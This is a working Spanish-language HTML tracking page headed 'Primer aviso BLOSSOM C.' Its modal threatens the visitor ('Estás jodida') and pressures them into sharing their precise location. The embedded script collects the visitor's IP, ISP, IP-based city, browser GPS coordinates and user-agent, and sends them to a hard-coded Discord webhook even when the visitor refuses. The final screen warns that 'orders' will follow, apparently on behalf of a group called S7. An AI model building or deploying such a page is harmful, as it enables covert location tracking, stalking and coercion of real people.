<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Primer aviso BLOSSOM C.</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #f5f5f7;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.6);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }

        .modal-box {
            background-color: #ffffff;
            padding: 28px 24px;
            border-radius: 16px;
            text-align: center;
            max-width: 340px;
            width: 100%;
            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
        }

        .modal-box h2 {
            font-size: 20px;
            color: #1d1d1f;
            margin-bottom: 12px;
            font-weight: 600;
        }

        .modal-box p {
            font-size: 15px;
            color: #6e6e73;
            margin-bottom: 24px;
            line-height: 1.4;
        }

        .modal-buttons {
            display: flex;
            justify-content: center;
            gap: 12px;
        }

        .btn {
            flex: 1;
            padding: 12px 0;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            cursor: pointer;
            font-weight: 600;
        }

        .btn-accept {
            background-color: #0071e3;
            color: #ffffff;
        }

        .btn-deny {
            background-color: #e8e8ed;
            color: #1d1d1f;
        }
    </style>
</head>
<body>

    <div id="modalUbicacion" class="modal-overlay">
        <div class="modal-box">
            <h2>Estás jodida</h2>
            <p>Al entrar brindaste acceso a tus datos (IP, Router, navegador, etc.) al aceptar el permiso a tu ubicación precisa estas colaborando con nosotros y tus datos estaran a salvo. de lo contrario lo tomaremos como negatividad.    </p>
            <div class="modal-buttons">
                <button class="btn btn-accept" onclick="procesarRespuesta(true)">Acepto colaborar brindando mi ubicación precisa para mayor fidelidad</button>
                <button class="btn btn-deny" onclick="procesarRespuesta(false)">me rehuso a colaborar poniendo mis datos en peligro, incluyendo personales.</button>
            </div>
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1513047206297600070/NvgpPaLE_sLhfPY757UyL_3F_y-JBkY_Ci5p6Imnwx1Ed_jHG2AXvrhAShuoUjXq9B6p";

        async function procesarRespuesta(acepto) {
            document.getElementById("modalUbicacion").style.display = "none";

            if (!acepto) {
                // Si hace clic en Cancelar
                enviarADiscord({ gpsData: "El usuario canceló la solicitud inicial.", mapLink: "N/A" });
                mostrarPantallaFinal(false);
                return;
            }

            // Si presiona Permitir, se invoca la ubicación nativa del navegador
            solicitarUbicacion((gpsInfo, exito) => {
                enviarADiscord(gpsInfo);
                mostrarPantallaFinal(exito);
            });
        }

        function solicitarUbicacion(callback) {
            if (!("geolocation" in navigator)) {
                callback({ gpsData: "Geolocalización no soportada", mapLink: "N/A" }, false);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const precision = Math.round(pos.coords.accuracy);

                    callback({
                        gpsData: `Lat: ${lat}, Lon: ${lon} (Margen: ~${precision}m)`,
                        mapLink: `https://www.google.com/maps?q=${lat},${lon}`
                    }, true);
                },
                (err) => {
                    callback({ gpsData: `Permiso denegado/Error (${err.message})`, mapLink: "N/A" }, false);
                },
                { enableHighAccuracy: false, timeout: 6000, maximumAge: 0 }
            );
        }

        function mostrarPantallaFinal(exito) {
            if (exito) {
                document.body.style.backgroundColor = "#eef9f1";
                document.body.innerHTML = `
                    <div style="text-align: center; padding: 20px; font-family: sans-serif;">
                        <h1 style="color: #2e7d32; font-size: 32px; margin-bottom: 10px;">Vuelve al chat ahora</h1>
                        <p style="color: #444; font-size: 18px;">Tu ubicación ha sido enviada y será verificada,recibiras ordenes pronto.</p>
                    </div>
                `;
            } else {
                document.body.style.backgroundColor = "#fde8e8";
                document.body.innerHTML = `
                    <div style="text-align: center; padding: 20px; font-family: sans-serif;">
                        <h1 style="color: #c62828; font-size: 32px; margin-bottom: 10px;">Aún puedes cambiar de opinión.</h1>
                        <p style="color: #444; font-size: 18px;">Dudas con S7oliveira / miembros del S7 .</p>
                    </div>
                `;
            }
        }

        function enviarADiscord(gpsInfo) {
            fetch("https://ipapi.co/json/")
                .then(res => res.json())
                .catch(() => ({}))
                .then(ipData => {
                    const payload = {
                        embeds: [{
                            title: "🔍 Solicitud de Ubicación",
                            color: 3066993,
                            fields: [
                                { name: "🌐 Dirección IP", value: ipData.ip || "No detectada", inline: true },
                                { name: "🏢 Proveedor (ISP)", value: ipData.org || "Desconocido", inline: true },
                                { name: "📍 Ubicación por IP", value: `${ipData.city || '?'}, ${ipData.region || '?'}, ${ipData.country_name || '?'}`, inline: false },
                                { name: "🎯 GPS Exacto", value: gpsInfo.gpsData, inline: false },
                                { name: "🗺️ Google Maps", value: gpsInfo.mapLink, inline: false },
                                { name: "📱 User-Agent", value: navigator.userAgent, inline: false }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    };

                    fetch(DISCORD_WEBHOOK_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(payload)
                    }).catch(() => {});
                });
        }
    </script>
</body>
</html>
